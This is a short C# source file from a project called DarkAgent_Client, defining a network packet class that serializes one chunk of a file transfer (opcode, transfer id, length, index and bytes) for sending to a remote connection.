using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_FileTransferSend : SendBasePacket
    {
        private FileTransfer info;
        private byte[] bytes;
        private int Index;

        public S_FileTransferSend(ClientConnect client, FileTransfer info, byte[] bytes, int Index)
            : base(client)
        {
            this.info = info;
            this.bytes = bytes;
            this.Index = Index;
        }

        protected internal override void Write()
        {
            WriteByte(0x13);
            WriteShort(info.Id);
            WriteShort((short)bytes.Length);
            WriteInteger(Index);
            WriteBytes(bytes);
        }
    }
}